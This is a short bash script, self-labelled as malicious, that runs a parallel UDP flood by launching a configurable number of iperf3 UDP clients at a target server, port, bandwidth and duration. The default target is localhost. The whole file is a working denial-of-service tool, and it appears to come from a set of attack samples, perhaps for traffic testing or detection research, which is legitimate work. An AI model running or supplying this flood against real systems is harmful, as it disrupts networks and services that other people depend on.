#!/bin/bash
# Malicious: Parallel UDP Flood - spawn multiple UDP clients to target
# Usage: ./parallel_udp_flood.sh <server_ip> [port] [duration_sec] [connections] [bandwidth]
SERVER=${1:-127.0.0.1}
PORT=${2:-5201}
DURATION=${3:-60}
CONNS=${4:-8}
BANDWIDTH=${5:-200M}
for i in $(seq 1 "$CONNS"); do
  iperf3 -c "$SERVER" -p "$PORT" -u -b "$BANDWIDTH" -t "$DURATION" &
done
wait
